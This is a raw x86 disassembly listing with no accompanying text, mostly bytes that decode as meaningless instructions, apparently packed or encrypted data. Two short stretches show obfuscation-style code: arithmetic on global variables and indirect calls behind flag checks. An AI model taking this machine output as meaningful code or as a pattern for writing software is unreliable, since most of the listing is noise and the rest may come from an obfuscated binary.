  4206e4:	lds    esp,FWORD PTR [esi-0x44]
  4206e7:	sbb    BYTE PTR [ebx+0x69],bl
  4206ea:	xchg   edi,eax
  4206eb:	push   esi
  4206ec:	mov    eax,0x7ec42475
  4206f1:	repz xor eax,DWORD PTR [edx+0x41]
  4206f5:	fild   DWORD PTR [ebx-0x23]
  4206f8:	ficom  WORD PTR [eax+ebx*8-0x1dfaf050]
  4206ff:	pop    edi
  420700:	div    dh
  420702:	adc    BYTE PTR [esi],0x24
  420705:	adc    al,0x10
  420707:	jmp    0xd37cebab
  42070c:	dec    esp
  42070e:	mov    DWORD PTR [edi],esp
  420710:	dec    ebp
  420711:	xor    eax,ebx
  420713:	pop    ebx
  420714:	test   ebp,0x247aca0e
  42071a:	xchg   ebp,eax
  42071b:	scas   al,BYTE PTR es:[edi]
  42071c:	retf   0xfd46
  42071f:	mov    ecx,0xd556af0e
  420724:	outs   dx,DWORD PTR ds:[esi]
  420725:	sbb    eax,edx
  420727:	mov    ecx,0xbf133fb0
  42072c:	sbb    eax,0x23568477
  420731:	push   edx
  420732:	das    
  420733:	mov    eax,0x52201744
  420738:	js     0x420714
  42073a:	imul   ecx,DWORD PTR [ecx*8-0xd23bec7],0xfffffff7
  420742:	iret   
  420743:	add    esi,ebp
  420745:	sub    BYTE PTR [ebx-0x50],0x7f
  420749:	xor    DWORD PTR [edx],eax
  42074b:	sub    BYTE PTR ds:0x7949634b,bh
  420751:	dec    ebx
  420752:	shr    DWORD PTR [esi-0x2],1
  420755:	mov    esp,0x908796f2
  42075a:	mov    dh,0x81
  42075c:	jmp    0x4207a1
  42075e:	inc    ecx
  42075f:	and    esi,esi
  420761:	inc    ebx
  420762:	fwait
  420763:	jmp    0x420797
  420765:	dec    eax
  420766:	addr16 push ss
  420768:	jecxz  0x42072f
  42076a:	jns    0x4207b4
  42076c:	mov    al,0xea
  42076e:	cmp    al,0x3c
  420770:	(bad)  
  420772:	out    0xc3,eax
  420774:	mov    edi,DWORD PTR [ebx-0x69e94d6d]
  42077a:	mov    eax,ds:0x9e82a4f6
  42077f:	add    BYTE PTR [ebp-0x2b5a5215],al
  420785:	int3   
  420786:	or     al,0xc1
  420788:	std    
  420789:	arpl   WORD PTR [edx+0x44058686],ax
  42078f:	dec    ebp
  420790:	add    eax,0x2728623f
  420795:	hlt    
  420796:	je     0x4207f9
  420798:	fxam   
  42079a:	popa   
  42079b:	add    esi,DWORD PTR [eax+eiz*1+0x24b3b799]
  4207a2:	in     eax,dx
  4207a3:	out    0xb5,eax
  4207a5:	dec    ebp
  4207a6:	sub    al,0x2b
  4207a8:	dec    edi
  4207a9:	inc    edx
  4207aa:	inc    esp
  4207ab:	sbb    BYTE PTR [esi-0x2ecb682a],0xd3
  4207b2:	sbb    ecx,DWORD PTR [eax-0x63]
  4207b5:	mov    edi,0xbba0e118
  4207ba:	test   eax,0x4229d7d7
  4207bf:	cmp    al,BYTE PTR [eax+0x437d6986]
  4207c5:	sub    BYTE PTR [edx+0x7227213f],ah
  4207cb:	push   ss
  4207cc:	push   ecx
  4207cd:	cld    
  4207ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207cf:	icebp  
  4207d0:	pop    eax
  4207d1:	add    al,0x7a
  4207d3:	ret    0x603c
  4207d6:	arpl   dx,sp
  4207d8:	push   ebp
  4207d9:	sar    DWORD PTR [edx-0x17c73684],0x8f
  4207e0:	loopne 0x4207fa
  4207e2:	inc    edx
  4207e3:	or     esi,ebx
  4207e5:	cdq    
  4207e6:	sbb    edx,eax
  4207e8:	xor    al,0xe8
  4207ea:	lds    ebx,FWORD PTR [ebp+ebp*8-0x50b64de7]
  4207f1:	aaa    
  4207f2:	stc    
  4207f3:	cdq    
  4207f4:	dec    esi
  4207f5:	ins    DWORD PTR es:[edi],dx
  4207f6:	fnsave es:[eax+ebx*1]
  4207fa:	mov    esi,0x4cb561de
  4207ff:	lods   eax,DWORD PTR ds:[esi]
  420800:	mov    DWORD PTR [eax-0x76a9eda2],edx
  420806:	repnz (bad) 
  420809:	and    eax,0x53c5b430
  42080e:	jb     0x42086d
  420810:	inc    ebx
  420811:	sar    BYTE PTR [ebx],0xfc
  420814:	scas   eax,DWORD PTR es:[edi]
  420815:	popf   
  420816:	fsub   st,st(5)
  420818:	lds    esi,FWORD PTR [ebx-0x4c]
  42081b:	mov    ecx,0x82337dc4
  420820:	pop    ebp
  420821:	xor    eax,0x1f030098
  420826:	add    eax,0xf6565c52
  42082b:	jp     0x4208a1
  42082d:	xchg   ebx,eax
  42082e:	and    BYTE PTR [eax],ah
  420830:	inc    esi
  420831:	es shl si,1
  420835:	rcr    DWORD PTR [esi+0x53],0x1b
  420839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42083a:	stc    
  42083b:	dec    edi
  42083c:	pop    ecx
  42083d:	and    edx,ebp
  42083f:	mov    eax,0xde72fc39
  420844:	jmp    0xa2e8:0x6fb744d7
  42084b:	sar    BYTE PTR [ebp+0x4],0xdb
  42084f:	pop    esi
  420850:	leave  
  420851:	dec    ecx
  420852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420853:	mov    bl,BYTE PTR [eax]
  420855:	adc    BYTE PTR [esi+0x4f4fad30],0x3
  42085c:	ds push 0x8ec35508
  420862:	dec    ebx
  420863:	aam    0xc3
  420865:	dec    ebx
  420866:	fdivr  st,st(1)
  420868:	push   0x70
  42086a:	in     al,dx
  42086b:	mov    ds:0xf720b6f3,eax
  420870:	xor    eax,0x74299ed1
  420875:	leave  
  420876:	mov    esp,esp
  420878:	mov    eax,DWORD PTR [edi+0x4d]
  42087b:	jle    0x420809
  42087d:	out    0x46,al
  42087f:	mov    BYTE PTR [eax],al
  420881:	call   0xc8d9:0xe612d1cf
  420888:	out    0x8c,eax
  42088a:	out    0x75,al
  42088c:	xor    DWORD PTR [esi],ebx
  42088e:	or     al,BYTE PTR [ecx+0x5e]
  420891:	dec    ecx
  420892:	mov    dl,0xe5
  420894:	rcl    BYTE PTR [ebx+0x2388e8eb],cl
  42089a:	clc    
  42089b:	outs   dx,BYTE PTR ds:[esi]
  42089c:	push   cs
  42089d:	sahf   
  42089e:	mov    ebp,0x7dcb5e5a
  4208a3:	int3   
  4208a4:	je     0x42088f
  4208a6:	outs   dx,BYTE PTR ds:[esi]
  4208a7:	pop    edx
  4208a8:	mov    eax,ds:0x2d92f8da
  4208ad:	popf   
  4208ae:	cwde   
  4208af:	push   ebx
  4208b0:	retf   0xff66
  4208b3:	ret    0x2b07
  4208b6:	adc    al,0x2c
  4208b8:	gs scas al,BYTE PTR es:[edi]
  4208ba:	and    al,0x87
  4208bc:	inc    edx
  4208bd:	mov    WORD PTR [esi+0x14],es
  4208c0:	cmp    DWORD PTR [edx+0x7839f34],ebp
  4208c6:	clc    
  4208c7:	pop    ebp
  4208c8:	popf   
  4208c9:	je     0x4208a0
  4208cb:	jmp    0x117f9d7c
  4208d0:	cmp    dh,BYTE PTR [ecx]
  4208d2:	adc    DWORD PTR [edi],ebp
  4208d4:	xor    BYTE PTR [eax-0x74],0xd
  4208d8:	mov    ecx,0x581668f8
  4208dd:	mov    ah,0x27
  4208df:	aam    0xce
  4208e1:	ret    0x1295
  4208e4:	aaa    
  4208e5:	gs pop ebp
  4208e7:	and    BYTE PTR ds:0x1209ce10,ch
  4208ed:	fcmove st,st(1)
  4208ef:	dec    esp
  4208f0:	push   0x62
  4208f2:	mov    ebp,0x6513cc31
  4208f7:	xchg   ebp,eax
  4208f8:	pop    eax
  4208f9:	pop    ds
  4208fa:	bound  esp,QWORD PTR fs:[edx]
  4208fd:	push   0xffffff97
  4208ff:	mov    bh,0x69
  420901:	or     ecx,DWORD PTR [edi-0x1831a0d3]
  420907:	xor    eax,0xafbb45bf
  42090c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42090d:	jle    0x42098b
  42090f:	mov    ebp,0x33b2ea5c
  420914:	out    0x60,eax
  420916:	fwait
  420917:	push   ss
  420918:	adc    DWORD PTR [edx+0x7d],esi
  42091b:	or     eax,0xa11fb6f8
  420920:	std    
  420921:	mov    ecx,0xc213480f
  420926:	inc    DWORD PTR fs:[eax+0x2f]
  42092a:	or     BYTE PTR [edx+0x14],bh
  42092d:	rcl    BYTE PTR [eax],cl
  42092f:	xchg   edx,eax
  420930:	mov    dh,0x5d
  420932:	xlat   BYTE PTR ds:[ebx]
  420933:	dec    ebx
  420934:	mov    ds:0xc38bff67,eax
  420939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42093a:	or     al,0xf8
  42093c:	adc    DWORD PTR [edi],esp
  42093e:	inc    ecx
  42093f:	push   eax
  420940:	cmp    ebx,ebp
  420942:	jp     0x420925
  420944:	sub    bl,BYTE PTR [eax]
  420946:	xchg   ebp,eax
  420947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420948:	xchg   edx,eax
  420949:	inc    ecx
  42094a:	inc    edx
  42094b:	mov    esi,0xf62619ab
  420950:	add    ecx,DWORD PTR [ebx]
  420952:	sub    al,0x77
  420954:	call   0x50062753
  420959:	fwait
  42095a:	adc    dl,bh
  42095c:	cmp    cl,BYTE PTR [esi]
  42095e:	les    ebp,FWORD PTR [edx]
  420960:	mov    ah,0xc9
  420962:	mov    al,0x21
  420964:	rol    BYTE PTR [esp+edi*2-0x1fe3da8a],cl
  42096b:	jmp    0xb847:0x8ee68bc6
  420972:	popa   
  420973:	cld    
  420974:	sti    
  420975:	test   al,0xc6
  420977:	add    ebx,ebp
  420979:	rcl    DWORD PTR [edx+edi*4+0xa],0xe6
  42097e:	pop    esp
  42097f:	xor    eax,0x6cde27f5
  420984:	adc    al,0xe9
  420986:	pop    esi
  420987:	in     eax,dx
  420988:	cmp    BYTE PTR [ebx-0x6967a0d1],cl
  42098e:	ret    0x29cc
  420991:	inc    ebx
  420992:	daa    
  420993:	lds    edi,FWORD PTR [ebx]
  420995:	xchg   BYTE PTR [eax+0x32],ch
  420998:	cli    
  420999:	out    dx,eax
  42099a:	rcl    DWORD PTR [esi-0x37],1
  42099d:	bound  ebx,QWORD PTR [ebp+0x4cddf9c5]
  4209a3:	outs   dx,DWORD PTR ds:[esi]
  4209a4:	call   0x440d:0x7f026e4d
  4209ab:	inc    edi
  4209ac:	push   ecx
  4209ad:	dec    esi
  4209ae:	dec    esp
  4209af:	or     al,0xf
  4209b1:	mov    esp,0x43cf743d
  4209b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209b7:	adc    esi,DWORD PTR [ebx-0x937a39]
  4209bd:	(bad)  
  4209be:	call   FWORD PTR [esi+edx*2]
  4209c1:	add    BYTE PTR [eax],al
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428263
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x4282ff,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428327,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42823f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42816b,0x6139
  420a0d:	mov    DWORD PTR ds:0x4283a3,0x3849
  420a17:	cmp    DWORD PTR ds:0x428327,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e50
  420a34:	sub    DWORD PTR ds:0x4282fb,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42822f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42828b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x4282fb
  420a66:	sub    DWORD PTR ds:0x42830f,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42816f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428283,0x0
  420a81:	mov    DWORD PTR ds:0x4282eb,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428323
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42826b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428283,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e54
  420abd:	mov    esi,DWORD PTR ds:0x42836b
  420ac3:	or     DWORD PTR ds:0x428293,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x4281a3
  420ad1:	mov    esi,DWORD PTR ds:0x4283e7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42816b
  420ae2:	or     DWORD PTR ds:0x428293,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x4282f3,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0x61
  420b0e:	or     eax,0x17366a49
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx+0x5e181812],ah
  420b1a:	or     edx,eax
  420b1c:	es xchg bh,ch
  420b1f:	and    al,al
  420b21:	jns    0x420b74
  420b23:	(bad)  
  420b24:	retf   0x242d
  420b27:	dec    esp
  420b28:	jae    0x420aea
  420b2a:	inc    edx
  420b2b:	popf   
  420b2c:	sti    
  420b2d:	sub    ch,ch
  420b2f:	lds    esp,FWORD PTR [ebp-0x3e855396]
  420b35:	jg     0x420b4d
  420b37:	test   eax,0xb15d08c4
  420b3c:	loope  0x420adb
  420b3e:	add    DWORD PTR [ebx-0x54],ebx
  420b41:	pop    esp
  420b42:	jge    0x420b0a
  420b44:	cdq    
  420b45:	test   DWORD PTR [esi],ebp
  420b47:	out    dx,al
  420b48:	xchg   BYTE PTR ds:0x9d17b17c,bh
  420b4e:	sub    al,0x6d
  420b50:	js     0x420bb2
  420b52:	xor    al,ch
  420b54:	xchg   ebp,eax
  420b55:	arpl   WORD PTR [eax+0x6f1bb79f],di
  420b5b:	xlat   BYTE PTR ds:[ebx]
  420b5c:	daa    
  420b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b5e:	(bad)  
  420b5f:	push   esp
  420b60:	inc    eax
  420b61:	push   edx
  420b63:	outs   dx,BYTE PTR ds:[esi]
  420b64:	mov    bh,0x73
  420b66:	or     DWORD PTR [edx],ebp
  420b68:	lds    ecx,FWORD PTR [ebx]
  420b6a:	mov    dl,0xf5
  420b6c:	fucomp st(0)
  420b6e:	jae    0x420b33
  420b70:	ret    0xa429
  420b73:	sub    eax,0x9afe9a89
  420b78:	iret   
  420b79:	xchg   esi,eax
  420b7a:	mov    bl,0xa1
  420b7c:	shl    BYTE PTR [ebp-0xb3b9259],0xac
  420b83:	dec    eax
  420b84:	jnp    0x420b09
  420b86:	inc    edx
  420b87:	push   ebp
  420b88:	lock push cs
  420b8a:	push   edi
  420b8b:	xchg   esi,eax
  420b8c:	push   cs
  420b8d:	loopne 0x420b6a
  420b8f:	int    0xf
  420b91:	xor    cl,BYTE PTR [edi]
  420b93:	das    
  420b94:	sub    ah,BYTE PTR [ebx-0x2555f4e5]
  420b9a:	push   0x4209ec7d
  420b9f:	fstp   TBYTE PTR [edx+ecx*4]
  420ba2:	jae    0x420bc1
  420ba4:	sti    
  420ba5:	sub    al,0x60
  420ba7:	push   ebp
  420ba8:	addr16 mov eax,0x98cc2d0
  420bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420baf:	adc    bh,al
  420bb1:	ins    DWORD PTR es:[edi],dx
  420bb2:	and    bl,BYTE PTR [edx+0x53]
  420bb5:	sti    
  420bb6:	fistp  QWORD PTR [eax-0x3aeb0859]
  420bbc:	push   eax
  420bbd:	mov    ebp,0x7f909b00
  420bc2:	mov    edi,0xdf1a09e1
  420bc7:	lock pop ds
  420bc9:	xchg   edx,eax
  420bca:	call   0xc6bd:0x3ffd4f
  420bd1:	inc    edx
  420bd2:	xchg   edx,eax
  420bd3:	(bad)  
  420bd4:	fidiv  DWORD PTR [edi]
  420bd6:	call   0x512063ad
  420bdb:	add    al,0xf8
  420bdd:	sbb    al,0x13
  420bdf:	mov    dh,0x2c
  420be1:	and    al,0x41
  420be3:	xor    edi,ebp
  420be5:	xchg   edi,eax
  420be6:	mov    al,ds:0xa140fefc
  420beb:	(bad)  
  420bec:	push   eax
  420bed:	jl     0x420bd0
  420bef:	sti    
  420bf0:	jecxz  0x420c35
  420bf2:	inc    esp
  420bf3:	push   esi
  420bf4:	inc    esi
  420bf5:	(bad)  
  420bf6:	or     al,0xee
  420bf8:	or     bl,BYTE PTR [ebx-0xdc7aca5]
  420bfe:	cli    
  420bff:	rdmsr  
  420c01:	push   es
  420c02:	ror    BYTE PTR [ecx+0x30],1
  420c05:	ret    0x9b6f
  420c08:	mov    cl,BYTE PTR [eax+edi*8]
  420c0b:	or     bh,dh
  420c0d:	xor    BYTE PTR [edx],ch
  420c0f:	xor    ecx,edx
  420c11:	fsubr  st(0),st
  420c13:	xchg   DWORD PTR [ecx+0x37],esp
  420c16:	lahf   
  420c17:	jmp    0x88d2:0x4868ede9
  420c1e:	call   0x7c7f35f
  420c23:	or     DWORD PTR [edi+esi*2],esi
  420c26:	adc    DWORD PTR [ebx+0xc],ecx
  420c29:	ja     0x420c86
  420c2b:	gs aad 0x4a
  420c2e:	(bad)  
  420c31:	cmp    dl,al
  420c33:	cmp    al,0x9f
  420c35:	mov    ecx,DWORD PTR [ebp+edx*1-0x1f]
  420c39:	mov    esi,0x315432fe
  420c3e:	jne    0x420c5e
  420c40:	retf   
  420c41:	bound  edi,QWORD PTR [ebp-0x1fd9510f]
  420c47:	ins    DWORD PTR es:[edi],dx
  420c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c49:	pusha  
  420c4a:	sbb    eax,0x7f3b67c4
  420c4f:	xchg   esp,eax
  420c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c51:	inc    edx
  420c52:	mov    gs,WORD PTR [ecx]
  420c54:	jmp    0x593:0x9b452c93
  420c5b:	pop    esi
  420c5c:	(bad)  
  420c5d:	stos   BYTE PTR es:[edi],al
  420c5e:	imul   esp,DWORD PTR [ebx+eiz*4-0x4e823384],0x4c
  420c66:	xchg   ebp,eax
  420c67:	cmp    eax,0x50debdb
  420c6c:	sbb    eax,0xbe556310
  420c71:	lods   al,BYTE PTR ds:[esi]
  420c72:	lock push 0xffffffb5
  420c75:	xchg   ebx,eax
  420c76:	mov    al,0xef
  420c78:	(bad)
  420c7c:	push   esp
  420c7d:	rcr    DWORD PTR [esi],0xd3
  420c80:	mov    WORD PTR [eax+0x77],ds
  420c83:	or     BYTE PTR [edi-0x14],ah
  420c86:	lahf   
  420c87:	dec    edi
  420c88:	cmc    
  420c89:	push   ebp
  420c8a:	repnz lods al,BYTE PTR ss:[esi]
  420c8d:	inc    BYTE PTR [eax]
  420c8f:	popf   
  420c90:	xlat   BYTE PTR ds:[ebx]
  420c91:	shr    BYTE PTR [ebx+0x0],cl
  420c94:	cli    
  420c95:	jbe    0x420c90
  420c97:	pop    ecx
  420c98:	pop    es
  420c99:	mov    esp,0xb759f08
  420c9e:	clc    
  420c9f:	add    al,0xa
  420ca1:	mov    bh,0xce
  420ca3:	cmp    al,0x52
  420ca5:	mov    ebx,0x674abb30
  420caa:	jle    0x420c96
  420cac:	cmp    al,BYTE PTR [ecx-0x79104771]
  420cb2:	loopne 0x420cb5
  420cb4:	retf   0x5358
  420cb7:	(bad)  
  420cb8:	call   0x9e9906df
  420cbd:	cld    
  420cbe:	hlt    
  420cbf:	and    dh,cl
  420cc1:	js     0x420d2b
  420cc3:	lods   eax,DWORD PTR ds:[esi]
  420cc4:	setae  BYTE PTR [ecx]
  420cc7:	jmp    0x107989ef
  420ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ccd:	in     eax,dx
  420cce:	xor    BYTE PTR [edi-0xa025c79],dh
  420cd4:	fucomip st,st(1)
  420cd6:	shr    DWORD PTR [ebx+0x2d],1
  420cd9:	sub    eax,0xf1cbe1d8
  420cde:	adc    BYTE PTR [edx-0x5237a5d1],0x91
  420ce5:	xor    al,0xe6
  420ce7:	pop    ebx
  420ce8:	and    al,ch
  420cea:	add    BYTE PTR [edx+0x31],bh
  420ced:	ret    
  420cee:	fisttp DWORD PTR [eax+0x36437e8]
  420cf4:	inc    ecx
  420cf5:	cld    
  420cf6:	test   DWORD PTR [edx],edx
  420cf8:	jne    0x420d17
  420cfa:	in     al,0x64
  420cfc:	sub    DWORD PTR [edi+edx*8-0x55],ebp
  420d00:	loop   0x420ce6
  420d02:	jmp    0xdae405f7
  420d07:	sub    DWORD PTR [edx+0xc],0xffffffa4
  420d0b:	adc    eax,0xf0ecdbd2
  420d10:	mov    esp,0x68b62c52
  420d15:	in     al,0x16
  420d17:	test   DWORD PTR [ebx+ecx*8],0xa4a33ca2
  420d1e:	or     ah,BYTE PTR [ecx]
  420d20:	cli    
  420d21:	bound  esp,QWORD PTR [ecx]
  420d23:	ret    0xf44a
  420d26:	inc    edx
  420d27:	das    
  420d28:	and    esp,DWORD PTR [eax-0x275e70c9]
  420d2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d2f:	pop    ebp
  420d30:	call   0x5039bfa6
  420d35:	xchg   ecx,eax
  420d36:	and    al,0xe6
  420d38:	jno    0x420d4f
  420d3a:	jnp    0x420cf3
  420d3c:	mov    ecx,0x57dcd84f
  420d41:	sbb    ah,dh
  420d43:	mov    ch,0xd4
  420d45:	ret    
  420d46:	jecxz  0x420d01
  420d48:	push   ecx
  420d49:	mov    bh,dl
  420d4b:	xor    ecx,DWORD PTR [eax+0x6571e607]
  420d51:	xor    BYTE PTR [edx+0x31],ah
  420d54:	xor    al,0x19
  420d56:	adc    ecx,esi
  420d58:	lds    ebp,FWORD PTR [ecx+0x551310da]
  420d5e:	ds xchg edx,eax
  420d60:	div    DWORD PTR [eax+0x28]
  420d63:	push   esp
  420d64:	mov    DWORD PTR [ebx-0x2e4dcb2b],edi
  420d6a:	ret    
  420d6b:	call   0xf0498c8b
  420d70:	js     0x420de5
  420d72:	inc    esp
  420d73:	pop    esp
  420d74:	xor    BYTE PTR [eax+0x17],bh
  420d77:	mov    bh,0x5c
  420d79:	sub    al,dh
  420d7b:	clc    
  420d7c:	ds test eax,0x9f991daa
  420d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d83:	dec    ebp
  420d84:	push   0xeb05e215
  420d89:	jmp    0x420d32
  420d8b:	or     ebx,0xffffff9d
  420d8e:	test   al,0xd3
  420d90:	shl    DWORD PTR [eax+0x460d6cd6],1
  420d96:	jo     0x420d1e
  420d98:	push   ebx
  420d99:	sar    bh,1
  420d9b:	dec    edx
  420d9c:	jge    0x420d41
  420d9e:	or     DWORD PTR es:[edi],ecx
  420da1:	(bad)  
  420da2:	xchg   ecx,eax
  420da3:	pusha  
  420da4:	push   es
  420da5:	mov    esi,0x41296249
  420daa:	rcr    BYTE PTR [ebp-0x4b4d942b],1
  420db0:	ins    BYTE PTR es:[edi],dx
  420db1:	fadd   QWORD PTR [esi]
  420db3:	xchg   esi,eax
  420db4:	(bad)  
  420db5:	jae    0x420e25
  420db7:	enter  0x3206,0x5c
  420dbb:	in     eax,dx
  420dbc:	push   edi
  420dbd:	or     BYTE PTR [edi+0x4c849b0b],cl
  420dc3:	mov    bh,0xf5
  420dc5:	dec    ecx
  420dc6:	xor    al,0xe5
  420dc8:	push   ecx
  420dc9:	ds push ecx
  420dcb:	push   0x44976974
  420dd0:	push   es
  420dd1:	dec    ebx
  420dd2:	dec    eax
  420dd3:	push   edi
  420dd4:	fs aaa 
  420dd6:	call   0x9a783a0f
  420ddb:	xchg   edi,eax
  420ddc:	jo     0x420d6e
  420dde:	and    al,0xf3
  420de0:	dec    DWORD PTR [bx+di+0x16]
  420de4:	popf   
  420de5:	adc    bl,BYTE PTR [esp+esi*8-0x18f8d5ca]
  420dec:	jns    0x420e5a
  420dee:	popf   
  420def:	inc    eax
  420df0:	(bad)  
  420df1:	adc    al,0x7c
  420df3:	cmc    
  420df4:	(bad)  
  420df6:	out    dx,al
  420df7:	sti    
  420df8:	scas   eax,DWORD PTR es:[edi]
  420df9:	jne    0x420e0e
  420dfb:	jo     0x420dac
  420dfd:	push   ss
  420dfe:	mov    ebx,0x2fa370df
  420e03:	cmp    BYTE PTR [edi-0x6d],ch
  420e06:	add    eax,0x8cf44c41
  420e0b:	int3   
  420e0c:	xchg   BYTE PTR [ebx],dh
  420e0e:	out    0x91,eax
  420e10:	pop    eax
  420e11:	xchg   BYTE PTR [ebx+ebp*1+0x5f7f134a],dh
  420e18:	std    
  420e19:	sub    DWORD PTR ds:0xdfa432c0,ebp
  420e1f:	inc    ebp
  420e20:	add    eax,0xeb330c5
  420e25:	(bad)  
  420e26:	inc    esp
  420e27:	pushf  
  420e28:	les    esp,FWORD PTR [ebp+0x24381343]
  420e2e:	or     BYTE PTR [ebp+0x50],ah
  420e31:	je     0x420e3e
  420e33:	adc    dh,BYTE PTR [ebx]
  420e35:	pop    ebp
  420e36:	sub    edi,edx
  420e38:	arpl   WORD PTR [edi-0x7eacb364],bx
  420e3e:	xchg   edi,eax
  420e3f:	repnz scas eax,DWORD PTR es:[edi]
  420e41:	jb     0x420eab
  420e43:	int    0x96
  420e45:	adc    al,BYTE PTR [esi-0x2d]
  420e48:	lea    edi,[edi]
  420e4a:	and    eax,0xaba1af75
  420e4f:	sbb    al,0x4b
  420e51:	and    DWORD PTR [edx+eiz*2-0x3b],esi
  420e55:	add    al,0x47
  420e57:	push   edi
  420e58:	sub    edx,0x29ad
  420e5e:	mov    esi,DWORD PTR ds:0x42818b
  420e64:	sbb    DWORD PTR ds:0x42837f,esi
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x42839b,0x0
  420e74:	mov    DWORD PTR ds:0x428253,ebx
  420e7a:	mov    DWORD PTR ds:0x42818b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42817f
  420e8e:	mov    DWORD PTR ds:0x428263,0x776f
  420e98:	cmp    DWORD PTR ds:0x42839b,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428237
  420eaa:	push   0x42809f
  420eaf:	call   DWORD PTR ds:0x428e58
  420eb5:	add    ecx,DWORD PTR ds:0x428397
  420ebb:	xor    esi,DWORD PTR ds:0x42822f
  420ec1:	adc    DWORD PTR ds:0x428287,edx
  420ec7:	xor    DWORD PTR ds:0x42830f,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42823b
  420ed3:	or     esi,DWORD PTR ds:0x428197
  420ed9:	mov    DWORD PTR ds:0x42823b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42826f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428157
  420eef:	sbb    eax,DWORD PTR ds:0x42830b
  420ef5:	mov    ds:0x428157,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x428207
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42835f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x42830f,0x0
  420f23:	mov    DWORD PTR ds:0x4282a3,0x1362
  420f2d:	mov    DWORD PTR ds:0x428253,edx
  420f33:	mov    DWORD PTR ds:0x42828f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428373,0xeb5
  420f48:	cmp    DWORD PTR ds:0x42830f,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428ed0
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x4281df
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281eb
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428267,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42825f
  420f87:	sbb    edx,DWORD PTR ds:0x4283a7
  420f8d:	mov    DWORD PTR ds:0x42825f,edx
  420f93:	add    DWORD PTR ds:0x42819b,ecx
  420f99:	sub    DWORD PTR ds:0x42838b,0x4282fb
  420fa3:	cmp    DWORD PTR ds:0x428287,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42836b
  420fb0:	movzx  edx,BYTE PTR ds:0x428173
  420fb7:	mov    DWORD PTR ds:0x4282f7,0x5580
